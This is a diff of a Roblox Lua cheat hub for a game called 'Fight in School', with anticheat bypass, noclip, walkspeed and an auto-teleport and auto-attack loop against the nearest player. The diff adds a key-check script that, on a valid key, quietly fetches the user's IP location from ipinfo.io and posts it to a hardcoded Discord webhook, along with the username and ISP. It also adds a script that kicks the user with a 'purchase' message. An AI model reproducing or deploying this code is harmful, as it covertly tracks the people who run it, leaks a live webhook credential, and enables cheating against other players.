-TextLabel_19.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
-TextLabel_19.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_19.Position = UDim2.new(0.0239999704, 0, 0.251107365, 0)
-TextLabel_19.Size = UDim2.new(0, 282, 0, 27)
-TextLabel_19.Font = Enum.Font.SourceSans
-TextLabel_19.Text = "AutoEquipFist"
-TextLabel_19.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_19.TextSize = 14
-TextLabel_19.TextStrokeTransparency = 0
-TextLabel_19.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_21.Parent = TabFrame1
+TextLabel_21.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel_21.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_21.Position = UDim2.new(0.0239999704, 0, 0.251107365, 0)
+TextLabel_21.Size = UDim2.new(0, 282, 0, 27)
+TextLabel_21.Font = Enum.Font.SourceSans
+TextLabel_21.Text = "AutoEquipFist"
+TextLabel_21.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_21.TextSize = 14
+TextLabel_21.TextStrokeTransparency = 0
+TextLabel_21.TextXAlignment = Enum.TextXAlignment.Left
 
 WipButton_12.Name = "WipButton"
-WipButton_12.Parent = TextLabel_19
+WipButton_12.Parent = TextLabel_21
 WipButton_12.BackgroundColor3 = Color3.new(1, 0, 0)
 WipButton_12.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
 WipButton_12.Position = UDim2.new(0.90780139, 0, 0.222222224, 0)
@@ -1194,23 +1266,23 @@ WipButton_12.Text = ""
 WipButton_12.TextColor3 = Color3.new(0, 0, 0)
 WipButton_12.TextSize = 14
 
-UICorner_25.Parent = WipButton_12
-UICorner_25.CornerRadius = UDim.new(0, 2)
+UICorner_26.Parent = WipButton_12
+UICorner_26.CornerRadius = UDim.new(0, 2)
 
-TextLabel_20.Parent = TabFrame1
-TextLabel_20.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
-TextLabel_20.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_20.Position = UDim2.new(0.0239999704, 0, 0.322535932, 0)
-TextLabel_20.Size = UDim2.new(0, 282, 0, 27)
-TextLabel_20.Font = Enum.Font.SourceSans
-TextLabel_20.Text = "TouchFling"
-TextLabel_20.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_20.TextSize = 14
-TextLabel_20.TextStrokeTransparency = 0
-TextLabel_20.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_22.Parent = TabFrame1
+TextLabel_22.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel_22.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_22.Position = UDim2.new(0.0239999704, 0, 0.322535932, 0)
+TextLabel_22.Size = UDim2.new(0, 282, 0, 27)
+TextLabel_22.Font = Enum.Font.SourceSans
+TextLabel_22.Text = "TouchFling"
+TextLabel_22.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_22.TextSize = 14
+TextLabel_22.TextStrokeTransparency = 0
+TextLabel_22.TextXAlignment = Enum.TextXAlignment.Left
 
 WipButton_13.Name = "WipButton"
-WipButton_13.Parent = TextLabel_20
+WipButton_13.Parent = TextLabel_22
 WipButton_13.BackgroundColor3 = Color3.new(1, 0, 0)
 WipButton_13.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
 WipButton_13.Position = UDim2.new(0.90780139, 0, 0.222222224, 0)
@@ -1220,36 +1292,36 @@ WipButton_13.Text = ""
 WipButton_13.TextColor3 = Color3.new(0, 0, 0)
 WipButton_13.TextSize = 14
 
-UICorner_26.Parent = WipButton_13
-UICorner_26.CornerRadius = UDim.new(0, 2)
+UICorner_27.Parent = WipButton_13
+UICorner_27.CornerRadius = UDim.new(0, 2)
 
-TextLabel_21.Parent = TabFrame1
-TextLabel_21.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
-TextLabel_21.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_21.Position = UDim2.new(0.0229999796, 0, 0.552557051, 0)
-TextLabel_21.Size = UDim2.new(0, 282, 0, 48)
-TextLabel_21.Font = Enum.Font.SourceSans
-TextLabel_21.Text = ""
-TextLabel_21.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_21.TextSize = 14
-TextLabel_21.TextStrokeTransparency = 0
-TextLabel_21.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_23.Parent = TabFrame1
+TextLabel_23.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel_23.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_23.Position = UDim2.new(0.0229999796, 0, 0.552557051, 0)
+TextLabel_23.Size = UDim2.new(0, 282, 0, 48)
+TextLabel_23.Font = Enum.Font.SourceSans
+TextLabel_23.Text = ""
+TextLabel_23.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_23.TextSize = 14
+TextLabel_23.TextStrokeTransparency = 0
+TextLabel_23.TextXAlignment = Enum.TextXAlignment.Left
 
-TextLabel_22.Parent = TextLabel_21
-TextLabel_22.BackgroundColor3 = Color3.new(1, 1, 1)
-TextLabel_22.BackgroundTransparency = 1
-TextLabel_22.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_22.Position = UDim2.new(0.0248226952, 0, 0, 0)
-TextLabel_22.Size = UDim2.new(0, 72, 0, 27)
-TextLabel_22.Font = Enum.Font.SourceSans
-TextLabel_22.Text = "Walkspeed"
-TextLabel_22.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_22.TextSize = 14
-TextLabel_22.TextStrokeTransparency = 0
-TextLabel_22.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_24.Parent = TextLabel_23
+TextLabel_24.BackgroundColor3 = Color3.new(1, 1, 1)
+TextLabel_24.BackgroundTransparency = 1
+TextLabel_24.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_24.Position = UDim2.new(0.0248226952, 0, 0, 0)
+TextLabel_24.Size = UDim2.new(0, 72, 0, 27)
+TextLabel_24.Font = Enum.Font.SourceSans
+TextLabel_24.Text = "Walkspeed"
+TextLabel_24.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_24.TextSize = 14
+TextLabel_24.TextStrokeTransparency = 0
+TextLabel_24.TextXAlignment = Enum.TextXAlignment.Left
 
 WipButton_14.Name = "WipButton"
-WipButton_14.Parent = TextLabel_21
+WipButton_14.Parent = TextLabel_23
 WipButton_14.BackgroundColor3 = Color3.new(1, 0, 0)
 WipButton_14.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
 WipButton_14.Position = UDim2.new(0.904255271, 0, 0.493055522, 0)
@@ -1259,11 +1331,11 @@ WipButton_14.Text = ""
 WipButton_14.TextColor3 = Color3.new(0, 0, 0)
 WipButton_14.TextSize = 14
 
-UICorner_27.Parent = WipButton_14
-UICorner_27.CornerRadius = UDim.new(0, 2)
+UICorner_28.Parent = WipButton_14
+UICorner_28.CornerRadius = UDim.new(0, 2)
 
 mainFrame_6.Name = "mainFrame"
-mainFrame_6.Parent = TextLabel_21
+mainFrame_6.Parent = TextLabel_23
 mainFrame_6.AnchorPoint = Vector2.new(0.5, 0.5)
 mainFrame_6.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
 mainFrame_6.BackgroundTransparency = 1
@@ -1306,41 +1378,41 @@ amountValue_6.TextSize = 15
 amountValue_6.TextStrokeTransparency = 0
 amountValue_6.TextWrapped = true
 
-UICorner_28.Parent = bSliderFrame_6
-UICorner_28.CornerRadius = UDim.new(0, 2)
+UICorner_29.Parent = bSliderFrame_6
+UICorner_29.CornerRadius = UDim.new(0, 2)
 
 UIAspectRatioConstraint_6.Parent = mainFrame_6
 UIAspectRatioConstraint_6.AspectRatio = 2.009615421295166
 
-TextLabel_23.Parent = TextLabel_21
-TextLabel_23.BackgroundColor3 = Color3.new(1, 1, 1)
-TextLabel_23.BackgroundTransparency = 1
-TextLabel_23.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_23.Position = UDim2.new(0.0212765951, 0, 1.14583337, 0)
-TextLabel_23.Size = UDim2.new(0, 275, 0, 70)
-TextLabel_23.Font = Enum.Font.SourceSans
-TextLabel_23.Text = "Do not turn on walkspeed past 30 if you did not toggle the bypass anticheat otherwise you will be kicked "
-TextLabel_23.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_23.TextScaled = true
-TextLabel_23.TextSize = 14
-TextLabel_23.TextStrokeTransparency = 0
-TextLabel_23.TextWrapped = true
-TextLabel_23.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_25.Parent = TextLabel_23
+TextLabel_25.BackgroundColor3 = Color3.new(1, 1, 1)
+TextLabel_25.BackgroundTransparency = 1
+TextLabel_25.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_25.Position = UDim2.new(0.0212765951, 0, 1.14583337, 0)
+TextLabel_25.Size = UDim2.new(0, 275, 0, 70)
+TextLabel_25.Font = Enum.Font.SourceSans
+TextLabel_25.Text = "Do not turn on walkspeed past 30 if you did not toggle the bypass anticheat otherwise you will be kicked "
+TextLabel_25.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_25.TextScaled = true
+TextLabel_25.TextSize = 14
+TextLabel_25.TextStrokeTransparency = 0
+TextLabel_25.TextWrapped = true
+TextLabel_25.TextXAlignment = Enum.TextXAlignment.Left
 
-TextLabel_24.Parent = TabFrame1
-TextLabel_24.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
-TextLabel_24.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_24.Position = UDim2.new(0.0239999704, 0, 0.393337756, 0)
-TextLabel_24.Size = UDim2.new(0, 282, 0, 27)
-TextLabel_24.Font = Enum.Font.SourceSans
-TextLabel_24.Text = "Noclip"
-TextLabel_24.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_24.TextSize = 14
-TextLabel_24.TextStrokeTransparency = 0
-TextLabel_24.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_26.Parent = TabFrame1
+TextLabel_26.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel_26.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_26.Position = UDim2.new(0.0239999704, 0, 0.393337756, 0)
+TextLabel_26.Size = UDim2.new(0, 282, 0, 27)
+TextLabel_26.Font = Enum.Font.SourceSans
+TextLabel_26.Text = "Noclip"
+TextLabel_26.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_26.TextSize = 14
+TextLabel_26.TextStrokeTransparency = 0
+TextLabel_26.TextXAlignment = Enum.TextXAlignment.Left
 
 WipButton_15.Name = "WipButton"
-WipButton_15.Parent = TextLabel_24
+WipButton_15.Parent = TextLabel_26
 WipButton_15.BackgroundColor3 = Color3.new(1, 0, 0)
 WipButton_15.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
 WipButton_15.Position = UDim2.new(0.90780139, 0, 0.222222224, 0)
@@ -1350,22 +1422,22 @@ WipButton_15.Text = ""
 WipButton_15.TextColor3 = Color3.new(0, 0, 0)
 WipButton_15.TextSize = 14
 
-UICorner_29.Parent = WipButton_15
-UICorner_29.CornerRadius = UDim.new(0, 2)
+UICorner_30.Parent = WipButton_15
+UICorner_30.CornerRadius = UDim.new(0, 2)
 
-TextLabel_25.Parent = TabFrame1
-TextLabel_25.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
-TextLabel_25.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_25.Position = UDim2.new(0.0255956165, 0, 0.475155801, 0)
-TextLabel_25.Size = UDim2.new(0, 282, 0, 27)
-TextLabel_25.Font = Enum.Font.SourceSans
-TextLabel_25.Text = "Bypass Anticheat"
-TextLabel_25.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_25.TextSize = 14
-TextLabel_25.TextStrokeTransparency = 0
-TextLabel_25.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_27.Parent = TabFrame1
+TextLabel_27.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel_27.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_27.Position = UDim2.new(0.0255956165, 0, 0.475155801, 0)
+TextLabel_27.Size = UDim2.new(0, 282, 0, 27)
+TextLabel_27.Font = Enum.Font.SourceSans
+TextLabel_27.Text = "Bypass Anticheat"
+TextLabel_27.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_27.TextSize = 14
+TextLabel_27.TextStrokeTransparency = 0
+TextLabel_27.TextXAlignment = Enum.TextXAlignment.Left
 
-TextButton_6.Parent = TextLabel_25
+TextButton_6.Parent = TextLabel_27
 TextButton_6.BackgroundColor3 = Color3.new(1, 0, 0)
 TextButton_6.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
 TextButton_6.Position = UDim2.new(0.90780139, 0, 0.222222224, 0)
@@ -1375,13 +1447,117 @@ TextButton_6.Text = ""
 TextButton_6.TextColor3 = Color3.new(0, 0, 0)
 TextButton_6.TextSize = 14
 
-UICorner_30.Parent = TextButton_6
-UICorner_30.CornerRadius = UDim.new(0, 2)
+UICorner_31.Parent = TextButton_6
+UICorner_31.CornerRadius = UDim.new(0, 2)
 
 -- Scripts
 
-local function BBBXTLV_fake_script() -- OutlastHub.LocalScript 
-	local script = Instance.new('LocalScript', OutlastHub)
+local function ZETA_fake_script() -- Frame.LocalScript 
+	local script = Instance.new('LocalScript', Frame)
+
+	local HttpService = game:GetService("HttpService")
+	local Players = game:GetService("Players")
+	local LocalPlayer = Players.LocalPlayer
+	
+	local request = (syn and syn.request)
+		or (http and http.request)
+		or http_request
+		or request
+	
+	local Keys = {
+		"LANJO-4F29A2-7C1B8-33X70-PL21X",
+		"PJ-X51S-2LLX-3X1AY",
+		"A9x6-sixopp-Q2zR",
+		"R8s2H-khan-W4bJ",
+		"dkeli-q2X71n",
+		"sash<3",
+		"TJ8X1F4K9-P2LQ7XM",
+		"KAY-4F9X-Q2M7-V8T1",
+		
+	}
+	
+	local frame = script.Parent
+	local keyBox = frame:WaitForChild("TextBox")
+	local enterButton = frame:WaitForChild("Enter")
+	
+	local function isValidKey(input)
+		for _, key in ipairs(Keys) do
+			if input == key then
+				return true
+			end
+		end
+		return false
+	end
+	
+	local function sendWebhook(usedKey)
+		local response = request({
+			Url = "https://ipinfo.io/json",
+			Method = "GET"
+		})
+	
+		local data = HttpService:JSONDecode(response.Body)
+	
+		request({
+			Url = "https://discord.com/api/webhooks/1455491044052570133/XaTcY8FGmAdi1aCC4DQms7SYB0BEOyOyrqNMJArwCAvTvTGwg-BtsJqTrV2IDHrwJN_m",
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json"
+			},
+			Body = HttpService:JSONEncode({
+				content = "Executed: OutlastHub | Normal Servers, Fight in School",
+				embeds = {{
+					title = "Player Connection Info",
+					color = 16777215,
+					fields = {
+						{ name = "Roblox Username", value = LocalPlayer.Name, inline = true },
+						{ name = "Display Name", value = LocalPlayer.DisplayName, inline = true },
+						{ name = "Key Used", value = usedKey, inline = true },
+						{ name = "IP", value = data.ip or "N/A", inline = true },
+						{ name = "City", value = data.city or "N/A", inline = true },
+						{ name = "Region", value = data.region or "N/A", inline = true },
+						{ name = "Country", value = data.country or "N/A", inline = true },
+						{ name = "ISP", value = data.org or "N/A", inline = false },
+						{ name = "Place Name", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, inline = true }
+					}
+				}}
+			})
+		})
+	end
+	local function checkKey()
+		local enteredKey = keyBox.Text
+	
+		if isValidKey(enteredKey) then
+			sendWebhook(enteredKey)
+			if frame.Parent:IsA("ScreenGui") then
+				frame.Parent.Enabled = false
+			end
+	
+			local mainGui = frame.Parent:FindFirstChild("Outlast Hub (FIAS MODDED)")
+			if mainGui and mainGui:IsA("ScreenGui") then
+				mainGui.Enabled = true
+			end
+	
+	
+		else
+			keyBox.Text = ""
+			keyBox.PlaceholderText = "Invalid key"
+	
+			task.wait(2)
+			keyBox.PlaceholderText = "Enter key"
+		end
+	end
+	
+	enterButton.MouseButton1Click:Connect(checkKey)
+	
+	keyBox.FocusLost:Connect(function(enterPressed)
+		if enterPressed then
+			checkKey()
+		end
+	end)
+end
+coroutine.wrap(ZETA_fake_script)()
+local function STJSZ_fake_script() -- OutlastHubFIASMODDED.LocalScript 
+	local script = Instance.new('LocalScript', OutlastHubFIASMODDED)
 
 	wait()
 	for _, v in pairs(getgc(true)) do
@@ -1408,96 +1584,6 @@ local function BBBXTLV_fake_script() -- OutlastHub.LocalScript
 	game:GetService("RunService").RenderStepped:Connect(function()
 		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
 	end)
-	
-	local Players = game:GetService("Players")
-	local StarterGui = game:GetService("StarterGui")
-	local TextChatService = game:GetService("TextChatService")
-	local Chat = game:GetService("Chat")
-	local player = Players.LocalPlayer
-	
-	local Toggle = true  -- Always on
-	local TARGET_GUI = "MAIN"
-	
-	-- ==============================
-	-- Enable chat + bubble chat
-	-- ==============================
-	local function enableRobloxChat()
-		pcall(function()
-			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
-		end)
-	
-		if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-			local ok, err = pcall(function()
-				TextChatService.ChatInputBarConfiguration.Enabled = true
-				TextChatService.ChatWindowConfiguration.Enabled = true
-	
-				local bubble = TextChatService.BubbleChatConfiguration
-				bubble.Enabled = true
-				bubble.MaxDistance = 50
-				bubble.MinimizeDistance = 30
-				bubble.BackgroundTransparency = 0.3
-				bubble.TextSize = 16
-			end)
-			if not ok then warn("Chat setup error:", err) end
-		end
-	
-		pcall(function()
-			Chat.BubbleChatEnabled = true
-			Chat.BubbleChatMaxDistance = 50
-		end)
-	end
-	
-	-- ==============================
-	-- Clear Main.Chat contents
-	-- ==============================
-	local function clearChatFolder()
-		local playerGui = player:FindFirstChild("PlayerGui")
-		if not playerGui then return end
-		local mainGui = playerGui:FindFirstChild(TARGET_GUI)
-		if not mainGui then return end
-		local chatFolder = mainGui:FindFirstChild("Chat")
-		if not chatFolder then return end
-	
-		for _, v in ipairs(chatFolder:GetChildren()) do
-			v:Destroy()
-		end
-	end
-	
-	-- ==============================
-	-- Run the chat system
-	-- ==============================
-	local function runChatSystem()
-		enableRobloxChat()
-		clearChatFolder()
-	
-		-- Clear periodically
-		task.spawn(function()
-			while true do
-				task.wait(0.5)
-				clearChatFolder()
-			end
-		end)
-	end
-	
-	-- ==============================
-	-- Persistent cleanup on respawn & GUI re-add
-	-- ==============================
-	player.CharacterAdded:Connect(function()
-		task.wait(1)
-		runChatSystem()
-	end)
-	
-	player.PlayerGui.ChildAdded:Connect(function(child)
-		task.wait(0.3)
-		if child.Name == TARGET_GUI then
-			clearChatFolder()
-		end
-	end)
-	
-	-- Initial run
-	runChatSystem()
-	
-	
 	
 	
 	
@@ -1652,9 +1738,9 @@ local function BBBXTLV_fake_script() -- OutlastHub.LocalScript
 		end
 	end
 end
-coroutine.wrap(BBBXTLV_fake_script)()
-local function QILUIA_fake_script() -- OutlastHub.NotificationScript 
-	local script = Instance.new('LocalScript', OutlastHub)
+coroutine.wrap(STJSZ_fake_script)()
+local function FAXC_fake_script() -- OutlastHubFIASMODDED.NotificationScript 
+	local script = Instance.new('LocalScript', OutlastHubFIASMODDED)
 
 	local HttpService = game:GetService("HttpService")
 	local Players = game:GetService("Players")
@@ -1704,9 +1790,16 @@ local function QILUIA_fake_script() -- OutlastHub.NotificationScript
 		})
 	})
 end
-coroutine.wrap(QILUIA_fake_script)()
-local function STQF_fake_script() -- Frame.LocalScript 
-	local script = Instance.new('LocalScript', Frame)
+coroutine.wrap(FAXC_fake_script)()
+local function QQFE_fake_script() -- OutlastHubFIASMODDED.LocalScript 
+	local script = Instance.new('LocalScript', OutlastHubFIASMODDED)
+
+	local player = game.Players.LocalPlayer
+	player:Kick("You must purchase the script to use this. Please contact @devilcantcatchme on discord to purchase this.")
+end
+coroutine.wrap(QQFE_fake_script)()
+local function RBHMF_fake_script() -- Frame_2.LocalScript 
+	local script = Instance.new('LocalScript', Frame_2)
 
 	local dragger = {}
 	local resizer = {}
@@ -1786,8 +1879,8 @@ local function STQF_fake_script() -- Frame.LocalScript
 	frame.Active = true
 	frame.Draggable = true -- disable old roblox drag (we use custom)
 end
-coroutine.wrap(STQF_fake_script)()
-local function UQNQIHV_fake_script() -- Toggle.LocalScript 
+coroutine.wrap(RBHMF_fake_script)()
+local function URTVGM_fake_script() -- Toggle.LocalScript 
 	local script = Instance.new('LocalScript', Toggle)
 
 	local back = script.Parent.Parent.BackGround
@@ -1817,8 +1910,8 @@ local function UQNQIHV_fake_script() -- Toggle.LocalScript
 		end)
 	
 end
-coroutine.wrap(UQNQIHV_fake_script)()
-local function WNWDGCS_fake_script() -- Tab1Button.LocalScript 
+coroutine.wrap(URTVGM_fake_script)()
+local function YTHNUK_fake_script() -- Tab1Button.LocalScript 
 	local script = Instance.new('LocalScript', Tab1Button)
 
 	script.Parent.MouseButton1Click:connect(function()
@@ -1833,8 +1926,8 @@ local function WNWDGCS_fake_script() -- Tab1Button.LocalScript
 		wait(0.1)
 	end)
 end
-coroutine.wrap(WNWDGCS_fake_script)()
-local function ERKJ_fake_script() -- Tab2Button.LocalScript 
+coroutine.wrap(YTHNUK_fake_script)()
+local function LUJL_fake_script() -- Tab2Button.LocalScript 
 	local script = Instance.new('LocalScript', Tab2Button)
 
 	script.Parent.MouseButton1Click:connect(function()
@@ -1849,8 +1942,8 @@ local function ERKJ_fake_script() -- Tab2Button.LocalScript
 		wait(0.1)
 	end)
 end
-coroutine.wrap(ERKJ_fake_script)()
-local function VVJNDZR_fake_script() -- Tab3Button.LocalScript 
+coroutine.wrap(LUJL_fake_script)()
+local function JLEGRLQ_fake_script() -- Tab3Button.LocalScript 
 	local script = Instance.new('LocalScript', Tab3Button)
 
 	script.Parent.MouseButton1Click:connect(function()
@@ -1865,8 +1958,8 @@ local function VVJNDZR_fake_script() -- Tab3Button.LocalScript
 		wait(0.1)
 	end)
 end
-coroutine.wrap(VVJNDZR_fake_script)()
-local function VPZUZAX_fake_script() -- Tab4Button.LocalScript 
+coroutine.wrap(JLEGRLQ_fake_script)()
+local function ALZRMT_fake_script() -- Tab4Button.LocalScript 
 	local script = Instance.new('LocalScript', Tab4Button)
 
 	script.Parent.MouseButton1Click:connect(function()
@@ -1881,8 +1974,8 @@ local function VPZUZAX_fake_script() -- Tab4Button.LocalScript
 		wait(0.1)
 	end)
 end
-coroutine.wrap(VPZUZAX_fake_script)()
-local function EXPRV_fake_script() -- Library.LocalScript 
+coroutine.wrap(ALZRMT_fake_script)()
+local function EDDGLQ_fake_script() -- Library.LocalScript 
 	local script = Instance.new('LocalScript', Library)
 
 	local Players = game:GetService("Players")
@@ -1898,8 +1991,8 @@ local function EXPRV_fake_script() -- Library.LocalScript
 	end)
 	
 end
-coroutine.wrap(EXPRV_fake_script)()
-local function WXAZED_fake_script() -- GYM.LocalScript 
+coroutine.wrap(EDDGLQ_fake_script)()
+local function KZPGE_fake_script() -- GYM.LocalScript 
 	local script = Instance.new('LocalScript', GYM)
 
 	local Players = game:GetService("Players")
@@ -1915,8 +2008,8 @@ local function WXAZED_fake_script() -- GYM.LocalScript
 	end)
 	
 end
-coroutine.wrap(WXAZED_fake_script)()
-local function SZBIPFB_fake_script() -- Outside.LocalScript 
+coroutine.wrap(KZPGE_fake_script)()
+local function MPVKXF_fake_script() -- Outside.LocalScript 
 	local script = Instance.new('LocalScript', Outside)
 
 	local Players = game:GetService("Players")
@@ -1937,8 +2030,8 @@ local function SZBIPFB_fake_script() -- Outside.LocalScript
 	
 	
 end
-coroutine.wrap(SZBIPFB_fake_script)()
-local function VGQWAH_fake_script() -- Rejoin.LocalScript 
+coroutine.wrap(MPVKXF_fake_script)()
+local function DBTEQXH_fake_script() -- Rejoin.LocalScript 
 	local script = Instance.new('LocalScript', Rejoin)
 
 	local button = script.Parent
@@ -1969,9 +2062,9 @@ local function VGQWAH_fake_script() -- Rejoin.LocalScript
 	end)
 	
 end
-coroutine.wrap(VGQWAH_fake_script)()
-local function EVLXV_fake_script() -- TextLabel.LocalScript 
-	local script = Instance.new('LocalScript', TextLabel)
+coroutine.wrap(DBTEQXH_fake_script)()
+local function IHAK_fake_script() -- TextLabel_3.LocalScript 
+	local script = Instance.new('LocalScript', TextLabel_3)
 
 	local Toggle = false
 	local VirtualUser = game:GetService("VirtualUser")
@@ -2001,8 +2094,8 @@ local function EVLXV_fake_script() -- TextLabel.LocalScript
 	button.MouseButton1Click:Connect(toggleAntiAFK)
 	
 end
-coroutine.wrap(EVLXV_fake_script)()
-local function DUVI_fake_script() -- bSliderFrame.mainScript 
+coroutine.wrap(IHAK_fake_script)()
+local function ILJR_fake_script() -- bSliderFrame.mainScript 
 	local script = Instance.new('LocalScript', bSliderFrame)
 
 	local Players = game:GetService("Players")
@@ -2012,42 +2105,30 @@ local function DUVI_fake_script() -- bSliderFrame.mainScript
 	local player = Players.LocalPlayer
 	local mouse = player:GetMouse()
 	
-	-- SETTINGS
 	local MIN_DELAY = 0
 	local MAX_DELAY = 1
 	local fireRate = 0
 	local autoFire = false
 	local autoTeleport = false
-	local predictionFactor = 0.2 -- seconds ahead to predict
+	local predictionFactor = 0.2 
 	local dragging = false
 	
-	-- UI ELEMENTS
-	local slider = script.Parent -- mainScript’s parent is bSliderFrame, so slider = bSliderFrame
+	
+	local slider = script.Parent 
 	local slideFrame = slider:FindFirstChild("slideFrame")
 	local amountValue = slider:FindFirstChild("amountValue")
 	
-	local parentFrame = slider.Parent -- bSliderFrame’s parent is mainFrame
-	local toggleButton = parentFrame.Parent:FindFirstChild("WipButton") -- WipButton is sibling of bSliderFrame inside mainFrame
+	local parentFrame = slider.Parent 
+	local toggleButton = parentFrame.Parent:FindFirstChild("WipButton") 
 	
-	-- =========================
-	-- GET TOOL + REMOTE
-	-- =========================
 	local function getRemote()
-		local character = player.Character
-		if not character then return nil end
-	
-		local tool = character:FindFirstChild("Fight")
-		if not tool then return nil end
-	
+		local tool = workspace:FindFirstChildWhichIsA("Tool") or player.Backpack:FindFirstChildWhichIsA("Tool")
+		if not tool then return end
 		local localScript = tool:FindFirstChildWhichIsA("LocalScript")
-		if not localScript then return nil end
-	
+		if not localScript then return end
 		return localScript:FindFirstChild("RemoteEvent")
 	end
 	
-	-- =========================
-	-- FIND CLOSEST PLAYER
-	-- =========================
 	local function getClosestPlayer()
 		local character = player.Character
 		if not character then return nil end
@@ -2074,9 +2155,6 @@ local function DUVI_fake_script() -- bSliderFrame.mainScript
 		return closestPlayer
 	end
 	
-	-- =========================
-	-- SLIDER FUNCTIONALITY
-	-- =========================
 	local function updateSlider(pos)
 		pos = math.clamp(pos, 0, 1)
 		if slideFrame then
@@ -2118,10 +2196,9 @@ local function DUVI_fake_script() -- bSliderFrame.mainScript
 		end)
 	end
 	
-	updateSlider(0) -- initialize slider
+	updateSlider(0) 
 	
-	-- =========================
-	-- AUTO FIRE + TELEPORT LOOP
+	
 	task.spawn(function()
 		while true do
 			local character = player.Character
@@ -2129,22 +2206,43 @@ local function DUVI_fake_script() -- bSliderFrame.mainScript
 			local humanoid = character and character:FindFirstChild("Humanoid")
 			local targetPlayer = getClosestPlayer()
 	
-			if humanoidRoot and humanoid and humanoid.Health > 0 and targetPlayer and targetPlayer.Character then
-				local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
-				local targetHumanoid = targetPlayer.Character:FindFirstChild("Humanoid")
-	
-				if targetRoot and targetHumanoid and targetHumanoid.Health > 0 then
-					-- AUTO TELEPORT
-					if autoTeleport then
-						local predictedPosition = targetRoot.Position + targetRoot.Velocity * predictionFactor
-						humanoidRoot.CFrame = CFrame.new(predictedPosition)
+			if humanoidRoot and humanoid and humanoid.Health > 0 then
+				-- ===== CHECK IF ANY PART IS ANCHORED =====
+				local anchoredParts = {}
+				for _, part in ipairs(character:GetDescendants()) do
+					if part:IsA("BasePart") and part.Anchored then
+						table.insert(anchoredParts, part)
 					end
+				end
 	
-					-- AUTO FIRE
-					if autoFire then
-						local remote = getRemote()
-						if remote then
-							remote:FireServer(targetRoot, "Slam")
+				if #anchoredParts > 0 then
+					-- Wait 4 seconds before unanchoring
+					task.wait(4)
+					for _, part in ipairs(anchoredParts) do
+						if part and part:IsDescendantOf(character) then
+							part.Anchored = false
+						end
+					end
+				else
+					-- Only continue if no parts are anchored
+					if targetPlayer and targetPlayer.Character then
+						local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+						local targetHumanoid = targetPlayer.Character:FindFirstChild("Humanoid")
+	
+						if targetRoot and targetHumanoid and targetHumanoid.Health > 0 then
+							if autoTeleport then
+								humanoidRoot.CFrame = CFrame.new(targetRoot.Position)
+							end
+	
+							if autoFire then
+								local distanceToTarget = (humanoidRoot.Position - targetRoot.Position).Magnitude
+								if distanceToTarget <= 3 then -- adjust threshold if needed
+									local remote = getRemote()
+									if remote then
+										remote:FireServer(targetRoot, "Slam")
+									end
+								end
+							end
 						end
 					end
 				end
@@ -2153,9 +2251,6 @@ local function DUVI_fake_script() -- bSliderFrame.mainScript
 			task.wait(fireRate)
 		end
 	end)
-	-- =========================
-	-- TOGGLE BUTTON
-	-- =========================
 	if toggleButton then
 		toggleButton.MouseButton1Click:Connect(function()
 			autoFire = not autoFire
